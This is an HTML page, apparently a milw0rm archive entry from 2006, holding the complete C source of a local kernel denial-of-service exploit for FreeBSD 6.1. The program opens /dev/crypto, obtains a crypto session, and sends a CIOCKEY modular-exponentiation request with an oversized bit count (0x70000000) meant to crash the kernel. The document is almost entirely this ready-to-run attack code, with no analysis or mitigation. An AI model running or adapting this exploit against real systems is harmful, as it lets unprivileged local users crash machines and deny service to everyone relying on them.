<html><head><title>FreeBSD 6.1 (/dev/crypto) Local Kernel Denial of Service Exploit</title></head><pre>// Evgeny Legerov (elegerov.blogspot.com)

#include unistd.h
#include sys/types.h
#include stdio.h
#include fcntl.h
#include crypto/cryptodev.h

int main()
{
        int fd2, fd;
        struct crypt_kop kop;

        printf(&quot;FreeBSD 6.1 /dev/crypto local kernel DoS\n&quot;);

        fd2 = open(&quot;/dev/crypto&quot;, O_RDWR, 0);
        if (fd2 == -1){
                perror(&quot;open&quot;);
                exit(-1);
        }

        if (ioctl(fd2, CRIOGET, &amp;fd) == -1) {
                perror(&quot;ioctl&quot;);
                exit(-1);
        }

        kop.crk_op = CRK_MOD_EXP;
        kop.crk_iparams = 3;
        kop.crk_oparams = 1;
        kop.crk_param[0].crp_nbits = 0x70000000;

        ioctl(fd, CIOCKEY, &amp;kop);

        printf(&quot;exploit failed\n&quot;);

        return 0;
}

// milw0rm.com [2006-10-24]</pre></html>